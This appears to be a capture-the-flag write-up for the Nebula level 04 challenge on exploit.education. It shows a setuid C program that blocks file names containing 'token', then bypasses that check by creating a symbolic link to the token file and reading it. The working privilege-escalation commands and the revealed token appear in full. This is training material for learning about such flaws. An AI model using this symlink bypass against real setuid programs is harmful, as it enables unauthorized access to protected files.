@@ -1,0 +1,68 @@
+Question URL:https://exploit.education/nebula/level-04/
+
+Source code:
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <fcntl.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  char buf[1024];
+  int fd, rc;
+
+  if(argc == 1) {
+      printf("%s [file to read]\n", argv[0]);
+      exit(EXIT_FAILURE);
+  }
+
+  if(strstr(argv[1], "token") != NULL) {        // Vulnerable code - It only checks if file name includes "token" or not.
+      printf("You may not access '%s'\n", argv[1]);
+      exit(EXIT_FAILURE);
+  }
+
+  fd = open(argv[1], O_RDONLY);       
+  if(fd == -1) {
+      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
+  }
+
+  rc = read(fd, buf, sizeof(buf));
+  
+  if(rc == -1) {
+      err(EXIT_FAILURE, "Unable to read fd %d", fd);
+  }
+
+  write(1, buf, rc);
+}
+
+level04@nebula:/home/flag04$ ls -al
+total 13
+drwxr-x--- 2 flag04 level04   93 2011-11-20 21:52 .
+drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
+-rw-r--r-- 1 flag04 flag04   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag04 flag04  3353 2011-05-18 02:54 .bashrc
+-rwsr-x--- 1 flag04 level04 7428 2011-11-20 21:52 flag04
+-rw-r--r-- 1 flag04 flag04   675 2011-05-18 02:54 .profile
+-rw------- 1 flag04 flag04    37 2011-11-20 21:52 token
+
+
+Background Knowledge
+a. The program, flag04, takes a filename as an input and displays its content.
+b. "token" file is read and writable only by flag04. Therefore level04 can execute with flag04 privilege (setuid is set) it 
+but cannot read it directly.
+b. flag04 code checks if a given file name includes "token" or not. If not, the code proceeds. 
+What if we can create an alias (symbolic link) for the file, "token" and provide the alias name as an input of flag04 code. 
+Eventually the code, flag04, will follow the link and read toke with the privilege of flag04 user (due to setuid)
+c. man ln 
+  : Symbolic links can hold arbitrary text; if later resolved, a relative link is interpreted in relation  to its parent directory.
+
+Sol.
+a. Create a symbolic link where level04 is writable for token and excute flag04 with the symbolic link as input file.
+level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/myass
+level04@nebula:/home/flag04$ ls -al /tmp/myass
+lrwxrwxrwx 1 level04 level04 18 2019-02-09 04:01 /tmp/myass -> /home/flag04/token
+level04@nebula:/home/flag04$ ./flag04 /tmp/myass
+06508b5e-8909-4f38-b630-fdb148a848a2
+
